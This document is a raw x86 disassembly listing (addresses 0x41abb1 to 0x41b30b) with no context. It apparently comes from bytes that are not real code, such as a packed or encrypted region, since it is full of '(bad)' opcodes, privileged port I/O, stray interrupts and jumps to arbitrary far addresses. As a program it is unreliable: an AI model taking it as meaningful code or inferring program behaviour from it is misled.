  41abb1:	jecxz  0x41ab7e
  41abb3:	cs cwde 
  41abb5:	add    ecx,esp
  41abb7:	stos   BYTE PTR es:[edi],al
  41abb8:	pop    es
  41abb9:	aaa    
  41abba:	lods   al,BYTE PTR ds:[esi]
  41abbb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41abbc:	ins    DWORD PTR es:[edi],dx
  41abbd:	xchg   DWORD PTR [ecx],esp
  41abbf:	inc    eax
  41abc0:	push   0x644676e2
  41abc5:	aaa    
  41abc6:	in     al,0xa2
  41abc8:	mov    al,ds:0x63bff0b3
  41abcd:	add    eax,0xa6741890
  41abd2:	js     0x41abf2
  41abd4:	loopne 0x41abe9
  41abd6:	push   eax
  41abd7:	inc    eax
  41abd8:	cmp    esp,DWORD PTR [ebx]
  41abda:	mov    ds:0x536998fe,al
  41abdf:	add    al,0xa2
  41abe1:	xchg   BYTE PTR [ebp-0x1],al
  41abe4:	cmp    BYTE PTR [edi+eax*8-0x63],dh
  41abe8:	fwait
  41abe9:	fwait
  41abea:	lods   eax,DWORD PTR ds:[esi]
  41abeb:	xchg   ebx,eax
  41abec:	cmp    al,0xe8
  41abee:	popa   
  41abef:	and    BYTE PTR ds:0x50923248,al
  41abf5:	(bad)  
  41abf6:	clc    
  41abf7:	mov    al,ds:0x4cf8f899
  41abfc:	arpl   WORD PTR ss:[ecx+0x32],ax
  41ac00:	(bad)  
  41ac01:	and    bl,BYTE PTR [esi+edx*4-0x46]
  41ac05:	fwait
  41ac06:	xor    BYTE PTR [esi+0x14ce7dcd],ah
  41ac0c:	pop    edi
  41ac0d:	add    eax,0xe8bb384a
  41ac12:	cs mov esi,0xc587d72a
  41ac18:	test   edi,esp
  41ac1a:	and    eax,0x873204d3
  41ac1f:	retf   
  41ac20:	icebp  
  41ac21:	add    esp,DWORD PTR [esi+ecx*4+0x7185f14f]
  41ac28:	pop    edi
  41ac29:	int    0xd5
  41ac2b:	xchg   BYTE PTR [edi-0x18961166],al
  41ac31:	push   edi
  41ac32:	out    dx,al
  41ac33:	mov    dl,0xac
  41ac35:	push   es
  41ac36:	jnp    0x41ac47
  41ac38:	sbb    eax,ebx
  41ac3a:	test   eax,0x1e561e9b
  41ac3f:	push   ecx
  41ac40:	sub    BYTE PTR [edi+0x7a],bl
  41ac43:	mov    al,0x41
  41ac45:	push   es
  41ac46:	sbb    ebx,DWORD PTR [ecx+0xcdf608c]
  41ac4c:	push   esi
  41ac4d:	push   ecx
  41ac4e:	loope  0x41ac74
  41ac50:	push   ds
  41ac51:	pop    ds
  41ac52:	or     al,0xda
  41ac54:	or     dl,bh
  41ac56:	push   ebx
  41ac57:	xchg   edi,eax
  41ac58:	adc    al,0x63
  41ac5a:	push   ebx
  41ac5b:	or     ch,BYTE PTR [edx+ebx*4+0x4a283519]
  41ac62:	add    ebp,DWORD PTR [esi+0xb]
  41ac65:	cmp    DWORD PTR [ecx],ebx
  41ac67:	call   FWORD PTR [ecx-0x7e]
  41ac6a:	out    dx,eax
  41ac6b:	or     eax,0xfd9ba99f
  41ac70:	(bad)  
  41ac72:	pop    esi
  41ac73:	jp     0x41ac60
  41ac75:	std    
  41ac76:	(bad)  
  41ac77:	xchg   edx,eax
  41ac78:	fldenv [eax]
  41ac7a:	daa    
  41ac7b:	jmp    0x1432:0x9aeaed2e
  41ac82:	or     BYTE PTR [ecx],al
  41ac84:	pushf  
  41ac85:	add    ecx,0xffffffd0
  41ac88:	(bad)  
  41ac89:	out    dx,eax
  41ac8a:	pop    es
  41ac8b:	sub    esp,DWORD PTR [edx-0x16]
  41ac8e:	push   esi
  41ac8f:	outs   dx,DWORD PTR ds:[esi]
  41ac90:	(bad)  
  41ac91:	ret    0xa47e
  41ac94:	inc    ecx
  41ac95:	push   esp
  41ac96:	xor    al,0x56
  41ac98:	dec    edi
  41ac99:	mov    dh,0x25
  41ac9b:	jge    0x41ac58
  41ac9d:	sbb    edx,DWORD PTR [edi-0x77]
  41aca0:	lahf   
  41aca1:	mov    WORD PTR ds:0x3656d224,cs
  41aca7:	mov    bl,0x6e
  41aca9:	jns    0x41ad20
  41acab:	cmp    eax,0x22bb71b3
  41acb0:	adc    bh,BYTE PTR [edi-0x14]
  41acb3:	ror    BYTE PTR [eax],cl
  41acb5:	lods   al,BYTE PTR ds:[esi]
  41acb6:	mov    dh,0xfd
  41acb8:	ficom  WORD PTR [ecx+ebx*4]
  41acbb:	jmp    0x82f1a6a2
  41acc0:	fidivr WORD PTR [edx-0x4]
  41acc3:	mov    edx,DWORD PTR [edi]
  41acc5:	push   ebp
  41acc6:	nop
  41acc7:	or     DWORD PTR [edx-0x241071d4],esi
  41accd:	lahf   
  41acce:	or     cl,BYTE PTR [edx+ecx*8]
  41acd1:	push   ds
  41acd2:	xchg   esi,eax
  41acd3:	(bad)  
  41acd4:	mov    edx,0xe652ab12
  41acd9:	rcl    DWORD PTR [edx],cl
  41acdb:	xor    DWORD PTR ds:0x5466fc19,edi
  41ace1:	mov    eax,0xfdd458d4
  41ace6:	mov    ebp,?
  41ace8:	xchg   esp,eax
  41ace9:	mov    bl,0x89
  41aceb:	sbb    eax,0xc5681af5
  41acf0:	pop    esi
  41acf1:	das    
  41acf2:	repnz imul si,WORD PTR [ecx+0x60f04b6],0x3b
  41acfb:	mov    ecx,0x9e20f682
  41ad00:	mov    ah,0x78
  41ad02:	sub    al,0x49
  41ad04:	xchg   ebp,eax
  41ad05:	clc    
  41ad06:	sahf   
  41ad07:	sbb    DWORD PTR [esp+ecx*8],0xffffffda
  41ad0b:	ja     0x41acb0
  41ad0d:	dec    esp
  41ad0e:	push   es
  41ad0f:	lahf   
  41ad10:	ds (bad) 
  41ad13:	inc    DWORD PTR [eax+ebx*4]
  41ad16:	shr    BYTE PTR [edi],cl
  41ad18:	inc    ebp
  41ad19:	xor    DWORD PTR cs:[ebp-0x6906515a],edx
  41ad20:	stos   DWORD PTR es:[edi],eax
  41ad21:	imul   esi,DWORD PTR [ebx],0x932fb3c5
  41ad27:	sti    
  41ad28:	mov    ecx,0xd93ba6c0
  41ad2d:	out    dx,eax
  41ad2e:	push   ecx
  41ad2f:	add    BYTE PTR [esi+0x3a],al
  41ad32:	add    DWORD PTR [esi],ebp
  41ad34:	add    al,0x24
  41ad36:	xor    bh,BYTE PTR [eax-0x67991e0c]
  41ad3c:	loope  0x41acdc
  41ad3e:	xchg   ebp,eax
  41ad3f:	cmp    ecx,edi
  41ad41:	push   ebp
  41ad42:	cwde   
  41ad43:	lahf   
  41ad44:	ret    
  41ad45:	cdq    
  41ad46:	pop    ebp
  41ad47:	shl    BYTE PTR [esi],1
  41ad49:	xor    al,0xb3
  41ad4b:	mov    edx,0x755a9fe5
  41ad50:	sbb    bl,bh
  41ad52:	pop    es
  41ad53:	cmp    ebx,DWORD PTR [edi+0x3efeba9c]
  41ad59:	int    0xf3
  41ad5b:	cmp    edi,DWORD PTR [ebx+0x78]
  41ad5e:	add    esp,DWORD PTR [eax+0x23]
  41ad61:	data16 out 0x8f,al
  41ad64:	out    0x52,al
  41ad66:	test   DWORD PTR [edi+0x1b],esi
  41ad69:	lods   al,BYTE PTR gs:[esi]
  41ad6b:	xchg   ebp,eax
  41ad6c:	xchg   esi,eax
  41ad6d:	mov    edi,0xff54db21
  41ad72:	in     al,0xa1
  41ad74:	xchg   DWORD PTR [esi],ecx
  41ad76:	stos   DWORD PTR es:[edi],eax
  41ad77:	addr16 (bad) 
  41ad7a:	scas   al,BYTE PTR es:[edi]
  41ad7b:	dec    esi
  41ad7c:	xchg   esi,eax
  41ad7d:	jge    0x41ad76
  41ad7f:	cs pop esi
  41ad81:	dec    eax
  41ad82:	sbb    eax,0x31f7a021
  41ad87:	pop    edx
  41ad88:	stc    
  41ad89:	sub    eax,0xb752c65c
  41ad8e:	cwde   
  41ad8f:	or     bl,cl
  41ad91:	jecxz  0x41ad68
  41ad93:	lahf   
  41ad94:	out    0x5b,eax
  41ad96:	lock in eax,dx
  41ad98:	jg     0x41ad50
  41ad9a:	xlat   BYTE PTR ds:[ebx]
  41ad9b:	cwde   
  41ad9c:	inc    ebx
  41ad9d:	mov    es,WORD PTR [ecx]
  41ad9f:	inc    esi
  41ada0:	mov    gs,WORD PTR [ecx+ebp*4]
  41ada3:	pusha  
  41ada4:	test   eax,0x8fb49a42
  41ada9:	adc    eax,0xade6d48a
  41adae:	pop    eax
  41adaf:	and    bh,ch
  41adb1:	mov    edx,0xfa41c3f0
  41adb6:	add    ch,bh
  41adb8:	aaa    
  41adb9:	shl    DWORD PTR [ebp-0x56],0x78
  41adbd:	jmp    0x41ada6
  41adbf:	xor    eax,0x418f18e6
  41adc4:	repz mov ebp,0x90e2b09e
  41adca:	sahf   
  41adcb:	and    ebp,DWORD PTR [ecx-0x5014f1a6]
  41add1:	inc    esi
  41add2:	jp     0x41ae2d
  41add4:	cdq    
  41add5:	fsubr  QWORD PTR [ebx]
  41add7:	icebp  
  41add8:	or     dh,BYTE PTR [edx]
  41adda:	sub    al,0x28
  41addc:	cmp    ah,BYTE PTR [esi]
  41adde:	or     DWORD PTR [esi+0x41],0x16
  41ade2:	mov    esi,0xcb5f993a
  41ade7:	(bad)  
  41ade8:	fild   WORD PTR [edx+ebx*1+0x58a6e981]
  41adef:	imul   ecx,DWORD PTR [esi+0x7d],0x25
  41adf3:	cwde   
  41adf4:	stc    
  41adf5:	pop    esi
  41adf6:	jne    0x41aded
  41adf8:	call   0x512e:0x9abccd89
  41adff:	int    0x4
  41ae01:	pop    edi
  41ae02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ae03:	mov    eax,ds:0x3e24ea63
  41ae08:	cli    
  41ae09:	xchg   esp,eax
  41ae0a:	fisubr WORD PTR [edx+0x7f]
  41ae0d:	in     al,dx
  41ae0e:	test   al,0xaf
  41ae10:	call   0x15c:0xa56087ce
  41ae17:	sub    al,0xfb
  41ae19:	cs or  eax,0x71ced608
  41ae1f:	scas   eax,DWORD PTR es:[edi]
  41ae20:	and    al,BYTE PTR [edi-0x5]
  41ae23:	out    0x59,al
  41ae25:	dec    ecx
  41ae26:	and    DWORD PTR [edi+0x12],0x3e
  41ae2a:	and    eax,0xd1f75c14
  41ae2f:	push   eax
  41ae30:	adc    ch,BYTE PTR [edx]
  41ae32:	pusha  
  41ae33:	out    dx,eax
  41ae34:	call   0xed642cd2
  41ae39:	shl    ebp,cl
  41ae3b:	mov    ebp,0xc81b47d5
  41ae40:	mov    al,0xbf
  41ae42:	inc    ecx
  41ae43:	adc    esp,esp
  41ae45:	(bad)  
  41ae46:	pop    ebp
  41ae47:	xchg   DWORD PTR ds:0xcd3b29ed,edi
  41ae4d:	inc    eax
  41ae4e:	retf   
  41ae4f:	add    BYTE PTR [edx-0x59d0245c],0xdd
  41ae56:	test   DWORD PTR [edx],edx
  41ae58:	jle    0x41ae95
  41ae5a:	add    edx,edx
  41ae5c:	aam    0xe7
  41ae5e:	ja     0x41aed0
  41ae60:	sbb    ecx,DWORD PTR [eax+ebx*8+0x55cf9a84]
  41ae67:	aas    
  41ae68:	je     0x41aece
  41ae6a:	lahf   
  41ae6b:	iret   
  41ae6c:	rcr    DWORD PTR [eax+0xe],cl
  41ae6f:	and    al,0xb1
  41ae71:	les    edx,FWORD PTR [ebx-0x1c084c24]
  41ae77:	push   0xa09e671d
  41ae7c:	ins    BYTE PTR es:[edi],dx
  41ae7d:	test   al,0x26
  41ae7f:	enter  0xf9b9,0x1
  41ae83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ae84:	leave  
  41ae85:	bound  eax,QWORD PTR [eax+0x10]
  41ae88:	xchg   edx,eax
  41ae89:	dec    ebp
  41ae8a:	and    eax,0xf81788b3
  41ae8f:	add    BYTE PTR [ebx-0x6c],al
  41ae92:	movaps xmm7,xmm2
  41ae95:	pop    ss
  41ae96:	pop    ss
  41ae97:	mov    ch,0xa0
  41ae99:	jo     0x41aef5
  41ae9b:	mov    edi,0xdb775d25
  41aea0:	std    
  41aea1:	adc    al,BYTE PTR [esi-0x393ef6ea]
  41aea7:	push   edi
  41aea8:	jnp    0x41ae52
  41aeaa:	and    bl,BYTE PTR [esi-0x68d64354]
  41aeb0:	retf   0x1563
  41aeb3:	sub    eax,0xa6cff132
  41aeb8:	and    BYTE PTR ds:0x79a6bac1,ch
  41aebe:	pop    esi
  41aebf:	xor    eax,esi
  41aec1:	loopne 0x41ae4e
  41aec3:	aaa    
  41aec4:	xchg   ebx,eax
  41aec5:	imul   esp,DWORD PTR [edx+0x75],0x8e6bf035
  41aecc:	cmp    ch,BYTE PTR [ebp-0x65]
  41aecf:	adc    al,0x84
  41aed1:	pop    es
  41aed2:	mov    BYTE PTR [ebx+0x7b],bl
  41aed5:	xor    DWORD PTR [edx+eiz*1-0x2772a6b5],edx
  41aedc:	mov    al,0x8b
  41aede:	push   ebx
  41aedf:	xchg   edi,eax
  41aee0:	pop    ss
  41aee1:	sub    eax,0xda0a00b9
  41aee6:	lds    edi,FWORD PTR [edx+ecx*2]
  41aee9:	pop    ecx
  41aeea:	frstor [eax]
  41aeec:	jle    0x41aeee
  41aeee:	mov    ebp,0x195c69c
  41aef3:	adc    BYTE PTR [ecx+0x2b],0xf1
  41aef7:	fiadd  WORD PTR [ebx+0x615b8243]
  41aefd:	scas   al,BYTE PTR es:[edi]
  41aefe:	push   eax
  41aeff:	dec    edx
  41af00:	xor    al,BYTE PTR [edx+0x6f08ff95]
  41af06:	add    cl,BYTE PTR [ecx+0x8]
  41af09:	mov    ds:0x2ee2eec1,eax
  41af0e:	leave  
  41af0f:	sub    ah,BYTE PTR [ebx+0x10d0a38a]
  41af15:	hlt    
  41af16:	pop    ebp
  41af17:	mov    eax,ds:0xafe57943
  41af1c:	(bad)  
  41af1d:	mov    dh,0xa6
  41af1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41af20:	fsubp  st(0),st
  41af22:	es adc al,0xd1
  41af25:	and    BYTE PTR [ecx+0x28a70e72],bh
  41af2b:	push   edx
  41af2c:	fdivr  st,st(3)
  41af2e:	int    0x74
  41af30:	fidivr DWORD PTR [ecx+0x38]
  41af33:	ror    dl,1
  41af35:	inc    edi
  41af36:	inc    edx
  41af37:	cmp    esi,0xffffffdb
  41af3a:	cmove  ecx,ebx
  41af3d:	lock mov ch,0x69
  41af40:	cs (bad) 
  41af42:	pop    ss
  41af43:	push   edx
  41af44:	test   DWORD PTR [edx+0x3b],eax
  41af47:	in     al,dx
  41af48:	jmp    0xc856287
  41af4d:	and    DWORD PTR [edi-0x582b9ce7],eax
  41af53:	sbb    DWORD PTR [ecx+0x77326e56],ecx
  41af59:	jle    0x41af19
  41af5b:	mov    WORD PTR [eax],fs
  41af5d:	xor    esi,0x94894279
  41af63:	pop    ds
  41af64:	arpl   WORD PTR [ebp-0x348136c9],sp
  41af6a:	cmc    
  41af6b:	dec    ebp
  41af6c:	pop    es
  41af6d:	sbb    al,0xa1
  41af6f:	lock xchg esp,eax
  41af71:	mov    esi,0xbde078a4
  41af76:	or     DWORD PTR [ecx],edi
  41af78:	adc    al,0x8c
  41af7a:	pop    ss
  41af7b:	mov    esp,DWORD PTR [ebp-0x68b0a2a5]
  41af81:	stos   DWORD PTR es:[edi],eax
  41af82:	repz enter 0x707e,0x22
  41af87:	(bad)  
  41af88:	adc    BYTE PTR [ecx-0x1388608c],dh
  41af8e:	in     al,dx
  41af8f:	add    edx,ecx
  41af91:	test   DWORD PTR [ebp+0x213ce4df],edi
  41af97:	xchg   edx,esp
  41af99:	inc    ebp
  41af9a:	xchg   ebx,eax
  41af9b:	add    ch,BYTE PTR [eax]
  41af9d:	and    eax,0x8e7d2f77
  41afa2:	sbb    dl,bh
  41afa4:	xlat   BYTE PTR ds:[ebx]
  41afa5:	pop    edi
  41afa6:	sbb    BYTE PTR [ecx-0x12],cl
  41afa9:	outs   dx,BYTE PTR ds:[esi]
  41afaa:	mov    ch,0xb2
  41afac:	in     al,dx
  41afad:	push   ds
  41afae:	cmp    DWORD PTR [ebx+ebx*2],ebp
  41afb1:	push   edx
  41afb2:	cmp    al,0x5c
  41afb4:	inc    ecx
  41afb5:	into   
  41afb6:	mov    al,ds:0x34330e52
  41afbb:	fcmovne st,st(7)
  41afbd:	or     eax,0xfc329547
  41afc2:	xchg   ebx,eax
  41afc3:	cmp    al,0xa4
  41afc5:	rcl    DWORD PTR [ecx-0xf],0x26
  41afc9:	cld    
  41afca:	adc    BYTE PTR ds:0xbff2d98,ch
  41afd0:	icebp  
  41afd1:	mov    edx,DWORD PTR [ecx]
  41afd3:	into   
  41afd4:	retf   
  41afd5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41afd6:	mov    eax,0xe645feee
  41afdb:	xor    eax,eax
  41afdd:	shr    BYTE PTR [ebx+edx*1-0x54949787],1
  41afe4:	aas    
  41afe5:	inc    edx
  41afe6:	sti    
  41afe7:	pusha  
  41afe8:	adc    BYTE PTR [ebx],ah
  41afea:	jmp    0x41af93
  41afec:	push   ebp
  41afed:	pop    edi
  41afee:	xchg   ebp,eax
  41afef:	jbe    0x41b048
  41aff1:	adc    DWORD PTR [edi+edx*1],0x202d2c05
  41aff8:	inc    ebp
  41aff9:	mov    BYTE PTR [esi],bh
  41affb:	mov    edx,ss
  41affd:	in     al,0xcc
  41afff:	(bad)  
  41b001:	pop    edx
  41b002:	pop    ebx
  41b003:	enter  0xd132,0x7d
  41b007:	mov    ebx,0x71961aa
  41b00c:	cmp    DWORD PTR [esi],edx
  41b00e:	ss jl  0x41b007
  41b011:	(bad)  
  41b012:	faddp  st(7),st
  41b014:	inc    eax
  41b015:	mov    al,ds:0x758722a6
  41b01a:	add    dl,BYTE PTR [eax+0x72]
  41b01d:	shl    ch,cl
  41b01f:	push   eax
  41b020:	icebp  
  41b021:	fiadd  WORD PTR [ebx]
  41b023:	mov    esp,0xd7d799d7
  41b028:	aas    
  41b029:	in     eax,dx
  41b02a:	mul    BYTE PTR [ecx+ecx*1-0x4b]
  41b02e:	mov    bl,0xd8
  41b030:	xchg   DWORD PTR [edx],ebp
  41b032:	lock test eax,0xa69c4724
  41b038:	and    cl,cl
  41b03a:	ror    BYTE PTR [esi+0x29],0xaf
  41b03e:	data16 lahf 
  41b040:	dec    esi
  41b041:	dec    edi
  41b042:	adc    esp,DWORD PTR [eax]
  41b044:	jno    0x41afef
  41b046:	and    DWORD PTR [ebx-0xe],edi
  41b049:	mov    cl,0xfa
  41b04b:	xor    BYTE PTR [edi],dl
  41b04d:	inc    ebp
  41b04e:	mov    bh,0x47
  41b050:	and    al,0x1c
  41b052:	into   
  41b053:	xchg   ecx,eax
  41b054:	sub    eax,0xcc530e02
  41b059:	inc    esi
  41b05a:	fwait
  41b05b:	inc    esi
  41b05c:	sbb    ebp,eax
  41b05e:	ret    
  41b05f:	fs jnp 0x41b066
  41b062:	clc    
  41b063:	mov    edx,0xf849b3a6
  41b068:	adc    BYTE PTR [ebp+eax*8+0x6cff0387],cl
  41b06f:	(bad)  
  41b070:	mov    ebx,0x5afc8189
  41b075:	mov    ds:0x4bf16cbb,eax
  41b07a:	adc    DWORD PTR [ecx+0x23],ebp
  41b07d:	jle    0x41b0ac
  41b07f:	and    eax,0x7e504e55
  41b084:	pop    esi
  41b085:	int    0x3
  41b087:	inc    edx
  41b088:	cs push ds
  41b08a:	ret    0xed5a
  41b08d:	mov    cl,0xbd
  41b08f:	adc    bh,BYTE PTR [esi-0x4a560740]
  41b095:	mov    edx,0xb697fdb
  41b09a:	xchg   BYTE PTR [ebp-0x40103852],cl
  41b0a0:	scas   al,BYTE PTR es:[edi]
  41b0a1:	scas   al,BYTE PTR es:[edi]
  41b0a2:	mov    eax,ds:0x4055522b
  41b0a7:	xchg   edi,eax
  41b0a8:	xchg   ebx,eax
  41b0a9:	mov    ds:0x7972cd8b,al
  41b0ae:	mov    al,ds:0x13176e80
  41b0b3:	mov    di,0x2e57
  41b0b7:	mov    al,0x9c
  41b0b9:	dec    esp
  41b0ba:	pop    esi
  41b0bb:	mov    edx,0x60cd0f3
  41b0c0:	add    DWORD PTR [ebx-0x4f],esp
  41b0c3:	cmp    edx,ebx
  41b0c5:	pop    ebp
  41b0c6:	(bad)  
  41b0c7:	mov    ebp,0xb56611f0
  41b0cc:	push   0x5a
  41b0ce:	push   cs
  41b0cf:	imul   ebx,DWORD PTR ds:0x8c6f20ea,0x3d9211e9
  41b0d9:	and    ah,BYTE PTR [eax+edx*8+0x7e]
  41b0dd:	or     ebp,DWORD PTR [esi+0x4b]
  41b0e0:	sbb    eax,0xdc7aad20
  41b0e5:	pop    esp
  41b0e6:	and    DWORD PTR [ebp+0x7d],edx
  41b0e9:	int    0x6d
  41b0eb:	xchg   ecx,eax
  41b0ec:	sar    DWORD PTR [ecx],0x68
  41b0ef:	test   DWORD PTR [edi-0x65d86488],ecx
  41b0f5:	xor    al,0x5
  41b0f7:	pop    esp
  41b0f8:	jge    0x41b0f5
  41b0fa:	test   BYTE PTR [esi-0x18],bh
  41b0fd:	ins    BYTE PTR es:[edi],dx
  41b0fe:	push   ss
  41b0ff:	hlt    
  41b100:	xchg   esi,eax
  41b101:	adc    BYTE PTR [esi-0x7e900740],ch
  41b107:	sbb    edx,edx
  41b109:	jbe    0x41b0e7
  41b10b:	or     BYTE PTR [ebx],al
  41b10d:	popa   
  41b10e:	add    ebx,DWORD PTR [edx-0x7e]
  41b111:	xor    ch,dh
  41b113:	add    al,0x76
  41b115:	jns    0x41b16e
  41b117:	inc    edx
  41b118:	in     al,0x54
  41b11a:	add    ch,BYTE PTR [edx-0x35]
  41b11d:	xor    dl,al
  41b11f:	loop   0x41b16f
  41b121:	in     al,dx
  41b122:	inc    ecx
  41b123:	xor    eax,0x11333529
  41b128:	lock cdq 
  41b12a:	sbb    esp,esp
  41b12c:	sbb    DWORD PTR ds:0xa4d6c3b0,ebx
  41b132:	fisttp DWORD PTR fs:[esi+0x4]
  41b136:	fisubr DWORD PTR [edi]
  41b138:	clc    
  41b139:	daa    
  41b13a:	mov    ecx,0x29f87654
  41b13f:	xchg   esp,eax
  41b140:	push   ebx
  41b141:	lahf   
  41b142:	mov    dl,0xa7
  41b144:	lods   eax,DWORD PTR ds:[esi]
  41b145:	add    bh,al
  41b147:	std    
  41b148:	pop    edi
  41b149:	pusha  
  41b14a:	xor    ebx,esp
  41b14c:	mov    ch,0x6d
  41b14e:	push   esp
  41b14f:	jb     0x41b15c
  41b151:	scas   eax,DWORD PTR es:[edi]
  41b152:	or     BYTE PTR [ebx+ecx*8+0x7e52e603],cl
  41b159:	outs   dx,DWORD PTR ds:[esi]
  41b15a:	mov    dh,0xa0
  41b15c:	and    eax,0xaff9beb4
  41b161:	mov    ss,WORD PTR [ebx]
  41b163:	call   FWORD PTR ds:0x98c462a5
  41b169:	lock inc esp
  41b16b:	aas    
  41b16c:	loop   0x41b1ac
  41b16e:	sub    ch,BYTE PTR [eax+edx*1+0x66155cf1]
  41b175:	add    BYTE PTR [edi+0x7ba04aa],bh
  41b17b:	(bad)  
  41b17c:	enter  0x6b93,0xee
  41b180:	add    al,0x87
  41b182:	mov    eax,0xe67713bb
  41b187:	and    dl,BYTE PTR [ecx-0x3a413bdf]
  41b18d:	fwait
  41b18e:	std    
  41b18f:	adc    al,0xf2
  41b191:	ja     0x41b18a
  41b193:	jl     0x41b186
  41b195:	adc    BYTE PTR [ebp+0x29],bh
  41b198:	sbb    eax,0x1d2784ed
  41b19d:	repnz inc edx
  41b19f:	jns    0x41b1d0
  41b1a1:	mov    esp,0x8f0113b2
  41b1a6:	adc    al,0x37
  41b1a8:	pop    ebp
  41b1a9:	out    0x32,eax
  41b1ab:	test   ah,bl
  41b1ad:	pop    esp
  41b1ae:	push   ebp
  41b1af:	pop    ebx
  41b1b0:	clc    
  41b1b1:	fs push ebp
  41b1b3:	out    dx,al
  41b1b4:	test   bh,al
  41b1b6:	cli    
  41b1b7:	mov    eax,0x280c1d05
  41b1bc:	push   ebp
  41b1bd:	inc    ecx
  41b1be:	lds    ebp,FWORD PTR [eax-0x6a]
  41b1c1:	mov    BYTE PTR [edi-0xc],al
  41b1c4:	icebp  
  41b1c5:	and    eax,0x6736967f
  41b1ca:	out    dx,al
  41b1cb:	stos   BYTE PTR es:[edi],al
  41b1cc:	adc    esi,DWORD PTR [ecx+0x781eeb20]
  41b1d2:	sbb    esi,DWORD PTR [edx+0x5b]
  41b1d5:	loope  0x41b201
  41b1d7:	imul   edx,edi,0xe652dd02
  41b1dd:	mov    al,0x42
  41b1df:	and    edx,DWORD PTR [esi+ebx*4]
  41b1e2:	imul   esi,ecx,0xffffffee
  41b1e5:	jl     0x41b25a
  41b1e7:	cmp    bl,bh
  41b1e9:	mov    ch,0x41
  41b1eb:	mov    ds:0xca37d7d4,al
  41b1f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b1f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b1f2:	inc    esp
  41b1f3:	pop    esi
  41b1f4:	pop    eax
  41b1f5:	mov    bl,0x6f
  41b1f7:	daa    
  41b1f8:	xor    edi,DWORD PTR [edx]
  41b1fa:	push   esp
  41b1fb:	xchg   DWORD PTR [esi-0x710434e0],esi
  41b201:	and    al,BYTE PTR [ebx+0xd]
  41b204:	popf   
  41b205:	jecxz  0x41b1cf
  41b207:	cmp    al,0xa2
  41b209:	jle    0x41b192
  41b20b:	jo     0x41b1a0
  41b20d:	nop
  41b20e:	fadd   DWORD PTR [esp+ecx*4-0x1e023694]
  41b215:	push   esp
  41b216:	arpl   WORD PTR [ebp-0x4f],bx
  41b219:	mov    ebx,0x5a9d7b94
  41b21e:	inc    esi
  41b21f:	xchg   esp,eax
  41b220:	int    0x5f
  41b222:	mov    ebx,0x96f01477
  41b227:	mov    fs,WORD PTR [edi+eiz*1-0x7c]
  41b22b:	mov    dl,0xb9
  41b22d:	js     0x41b282
  41b22f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b230:	bound  esp,QWORD PTR [eax+0x65]
  41b233:	lock mov ecx,0x8591b82b
  41b239:	out    0xfd,al
  41b23b:	xor    al,0xbd
  41b23d:	mov    esp,0x81673630
  41b242:	pop    es
  41b243:	jmp    0x41b248
  41b245:	scas   al,BYTE PTR es:[edi]
  41b246:	clc    
  41b247:	jl     0x41b22e
  41b249:	cmp    eax,0xfa66b6e0
  41b24e:	cwde   
  41b24f:	loop   0x41b1e2
  41b251:	sbb    DWORD PTR [ecx+0x5e7a107e],0x4d
  41b258:	in     al,dx
  41b259:	daa    
  41b25a:	es xchg ebx,eax
  41b25c:	inc    ebx
  41b25d:	cmp    eax,0x4d276172
  41b262:	xor    BYTE PTR [esi+0x49bcd138],cl
  41b268:	in     al,dx
  41b269:	push   ss
  41b26a:	nop
  41b26b:	aam    0x5f
  41b26d:	mov    ds:0xbb0599b9,eax
  41b272:	std    
  41b273:	mov    ds:0x9becccb1,eax
  41b278:	mov    dl,0x5
  41b27a:	dec    ecx
  41b27b:	pop    ds
  41b27c:	dec    esp
  41b27d:	push   edi
  41b27e:	lods   al,BYTE PTR ds:[esi]
  41b27f:	lods   al,BYTE PTR ds:[esi]
  41b280:	push   edx
  41b281:	jo     0x41b29e
  41b283:	arpl   bp,di
  41b285:	sbb    BYTE PTR [edi],ah
  41b287:	inc    esp
  41b288:	push   edi
  41b289:	adc    BYTE PTR [ebx+0x57],dl
  41b28c:	aaa    
  41b28d:	push   ebp
  41b28e:	and    edi,ebp
  41b290:	cmp    bh,dh
  41b292:	sub    DWORD PTR [edx],ebp
  41b294:	(bad)  
  41b296:	aaa    
  41b297:	mov    bh,0x8d
  41b299:	inc    esp
  41b29a:	fucom  st(2)
  41b29c:	xor    al,0x96
  41b29e:	jbe    0x41b286
  41b2a0:	dec    eax
  41b2a1:	mov    dh,0x4d
  41b2a3:	jg     0x41b243
  41b2a5:	sbb    al,0x3c
  41b2a7:	inc    ebx
  41b2a8:	aad    0xd0
  41b2aa:	and    eax,0x65350e4f
  41b2af:	ds (bad) 
  41b2b1:	sti    
  41b2b2:	int3   
  41b2b3:	push   0x7d99b653
  41b2b8:	inc    ecx
  41b2b9:	and    eax,0xffffff82
  41b2bc:	les    ebx,FWORD PTR [eax+0xbadda70]
  41b2c2:	xor    eax,0x6cc1cfbd
  41b2c7:	mov    esp,esp
  41b2c9:	es std 
  41b2cb:	imul   edi,edx,0xffffffdc
  41b2ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b2cf:	xlat   BYTE PTR ds:[ebx]
  41b2d0:	jnp    0x41b2b7
  41b2d2:	or     ch,al
  41b2d4:	jg     0x41b33c
  41b2d6:	mov    bh,0x22
  41b2d8:	or     ecx,DWORD PTR [eax]
  41b2da:	outs   dx,DWORD PTR ds:[esi]
  41b2db:	jo     0x41b2f8
  41b2dd:	push   edi
  41b2de:	inc    edi
  41b2df:	aad    0x73
  41b2e1:	in     eax,0xed
  41b2e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b2e4:	inc    eax
  41b2e5:	jno    0x41b2f7
  41b2e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b2e8:	xchg   DWORD PTR [eax+edx*4-0x12],ecx
  41b2ec:	fs sub al,0xee
  41b2ef:	mov    ebp,0x8a7295d5
  41b2f4:	jns    0x41b291
  41b2f6:	mov    ecx,0x5cf857ab
  41b2fb:	fnsave [eax-0x5f]
  41b2fe:	adc    DWORD PTR [ebx+edi*8],0x51
  41b302:	stos   BYTE PTR es:[edi],al
  41b303:	pusha  
  41b304:	add    DWORD PTR [ecx-0x101108d8],eax
  41b30a:	sti    
  41b30b:	jb     0x41b31a
